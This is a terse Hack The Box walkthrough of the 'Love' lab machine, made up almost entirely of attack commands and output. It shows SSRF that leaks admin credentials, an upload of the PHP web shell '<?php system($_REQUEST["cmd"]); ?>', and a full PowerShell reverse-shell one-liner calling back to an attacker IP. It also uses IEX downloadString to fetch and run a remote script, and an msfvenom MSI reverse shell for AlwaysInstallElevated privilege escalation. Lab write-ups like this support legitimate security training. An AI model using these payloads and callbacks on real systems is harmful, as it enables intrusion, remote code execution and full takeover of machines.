### 09-Feb-24-Fri

[Love](https://app.hackthebox.com/machines/Love)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0389d886-6713-4860-9ce3-9b4247972d27)

*Credits - https://www.youtube.com/@ippsec https://youtu.be/V_7ubkfnPK4*

```
sudo nmap -p- --min-rate 10000 -v -oA love-allports 10.129.207.242
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/075752d7-4e81-42fa-9907-82baaa8168e2)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7ed88496-e193-4825-9d23-c4fc4f288af9)

```
echo "10.129.207.242 www.love.htb staging.love.htb" |sudo tee -a /etc/hosts
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9940c422-33dd-4565-8b40-0a1260598ce7)

http://www.love.htb/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/040f4e17-35cc-4df9-8606-bd32d2b5a2ae)

http://staging.love.htb/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a5c6346c-2d0c-4012-a4c0-7a8dc4656f42)

http://staging.love.htb/beta.php

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/db3c87a8-82f7-442f-82f2-416574f07381)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c3159106-8042-481d-9517-df387a6ee63c)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/3222eb55-9e79-452d-a356-2fd0d20eb3f7)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/910c7c22-f9a5-40a2-a560-f7b0faf58734)

```
file:///etc/passwd
```

```
127.0.0.1/etc/passwd
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4f12e8ea-9c6b-45be-9553-5483d7206b65)

```
http://127.0.0.1
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4ca88ffa-d065-4f9c-9817-3c9772640bdf)

```
http://127.0.0.1:5000
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/60fc7774-ea0a-4082-8c01-f523c8155e9c)

```
Vote Admin Creds admin: @LoveIsInTheAir!!!!
```

```
admin
```

```
@LoveIsInTheAir!!!!
```

[Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution) - PHP webapps Exploit](https://www.exploit-db.com/exploits/49445)

```
searchsploit -m 49445
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b26d2cb0-02ee-4951-9269-d4fb426d6812)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4b23a210-b096-49ed-98bf-b687c60dd886)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b65610dd-31d3-4e2c-bde8-5e9bcb83e594)

http://www.love.htb/admin/

http://www.love.htb/admin/home.php

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7580ea29-e333-4f88-883c-b23f0566b1e8)

http://www.love.htb/admin/voters.php

*Credits --> https://medium.com/@joemcfarland/hack-the-box-love-writeup-d58982ffa4ec*

```
------WebKitFormBoundaryM93O7d6XpEp6S0dP
Content-Disposition: form-data; name="photo"; filename="haxez.php"
Content-Type: image/jpeg
<?php system($_REQUEST["cmd"]); ?>
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/210c2d49-945b-4dd5-b732-766862cd2b5d)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b6f74463-7788-483a-a083-3f72f1dde6b8)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b4f82c71-8222-46f3-8230-ee7b017c1b4e)

GET /images/haxez.php

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5c8c2b98-ba08-4d9e-b68e-d97147f5794c)

http://www.love.htb/images/haxez.php

http://www.love.htb/images/haxez.php?cmd=whoami

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2562d888-0043-4042-9499-b3a03de1b9d9)

```
love\phoebe
```

view-source:http://www.love.htb/images/haxez.php?cmd=dir

```
------WebKitFormBoundaryM93O7d6XpEp6S0dP
Content-Disposition: form-data; name="photo"; filename="haxez.php"
Content-Type: image/jpeg
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\xampp\htdocs\omrs\images

02/09/2024  09:42 PM    <DIR>          .
02/09/2024  09:42 PM    <DIR>          ..
05/18/2018  07:10 AM             4,240 facebook-profile-image.jpeg
02/09/2024  09:42 PM               167 haxez.php
04/12/2021  02:53 PM                 0 index.html.txt
01/26/2021  11:08 PM               844 index.jpeg
08/24/2017  03:00 AM            26,644 profile.jpg
               5 File(s)         31,895 bytes
               2 Dir(s)   4,133,908,480 bytes free
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bafb2c0e-72fd-4087-aba3-06df2516bb07)

view-source:http://www.love.htb/images/haxez.php?cmd=dir%20C:\Users\phoebe\Desktop

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d6cee341-55d9-418f-8ed4-1c88268339a9)

view-source:http://www.love.htb/images/haxez.php?cmd=type%20C:\Users\phoebe\Desktop\user.txt

```
7ae38e758d2376ef611d1e7a730b2d21
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ca9e7228-0129-4641-b8de-e55fdbcb32bf)

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.20',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.20/hax.ps1')"
```

http://www.love.htb/images/haxez.php?cmd=powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.20/hax.ps1')"

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/bd227268-13ae-4642-abff-ca0b2f2223e6)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1ec3e109-917f-4518-9f71-ef2a75a49ae3)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/409aecae-9bd9-47b1-b451-d8b16f8dc289)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fdb33817-9b86-4a1a-ab4d-8de801358047)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b074e1fc-0b1a-4a59-b96a-f33ecdbbadaf)

```
curl 10.10.16.20:8000/winPEASany_ofs.exe -o C:/Users/Public/win.exe
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/037c5138-c7a5-46f3-ab72-ddab56ac9b5e)

```
get-applockerpolicy -effective | select -expandproperty rulecollections
```

```
PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in 
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%OSDRIVE%\*}
PathExceptions      : {%OSDRIVE%\Administration\*}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 7eadbece-51d4-4c8b-9ab5-39faed1bd93e
Name                : %OSDRIVE%\*
Description         : 
UserOrGroupSid      : S-1-1-0
Action              : Deny

PathConditions      : {%OSDRIVE%\Administration\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : e6d62a73-11da-4492-8a56-f620ba7e45d9
Name                : %OSDRIVE%\Administration\*
Description         : 
UserOrGroupSid      : S-1-5-21-2955427858-187959437-2037071653-1002
Action              : Allow
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.20 LPORT=443 -f msi -o reverse.msi
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b9d4f99b-de12-4acb-8a9f-31225b624e43)

```
wget 10.10.16.20/reverse.msi -o reverse.msi
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/962ab956-5eb5-496a-9605-71079f0a4ae5)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/5a6fdb04-ed55-4dc6-a1a5-866a1b5e3abe)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1a2a161e-9c9f-4d47-901c-98cb3008d7f1)

```
2352ff7a80b39e926181927760a724f5
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/31070ee6-6b49-4012-b775-f548e5465bce)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1edf6353-d4c2-4b88-9fb0-e6f13ef2d4ca)
